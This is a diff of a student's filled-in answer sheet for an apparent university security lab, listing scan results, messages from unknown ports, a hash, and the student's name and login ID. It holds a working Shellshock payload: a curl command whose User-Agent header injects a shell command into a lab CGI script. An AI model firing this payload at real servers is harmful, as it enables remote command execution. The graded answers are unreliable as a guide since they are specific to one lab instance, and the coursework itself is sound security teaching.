@@ -16,8 +16,8 @@ Example:
   Your Name: Kyuhong Park
 
 -->
-  Your GT Login ID: 
-  Your Name: 
+  Your GT Login ID:  imalik30
+  Your Name: Irfan Malik
 <--
 
 Task 1
@@ -28,7 +28,7 @@ Task 1
 Example:
   IP : 10.0.2.3
 -->
-  IP : 
+  IP : 10.0.2.4
 <--
 
 
@@ -38,7 +38,7 @@ Example:
   Port : 73
 
 -->
-  Port : 
+  Port : 80
 <--
 
 3. List each port whose service name is shown as "unknown", and the message obtained by connecting to that port.
@@ -51,7 +51,16 @@ Example:
   ...
 
 -->
-
+  Port : 9095
+  Answer : 1307941078
+  Port : 9096
+  Answer : 1766490697
+  Port : 9097
+  Answer : -972928378
+  Port : 9098
+  Answer : 73401510
+  Port : 9099
+  Answer : 2027631930
 <--
 
 
@@ -64,14 +73,14 @@ Example:
   Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
 
 -->
-  Command : 
+  Command : curl -H 'User-Agent: () { :; };   /bin/task2 imalik30' bash -s :'' http://10.0.2.4:80/cgi-bin/shellshock.cgi
 <--
 
 
 2. What hash value is returned by running ./bin/task2 with your student ID.
 
 -->
-  Hash : 
+  Hash : c08a0d15d854a635ce4e1594862d0f7ed8ec747255703192e7d7d1d975678f39
 <--
 
 
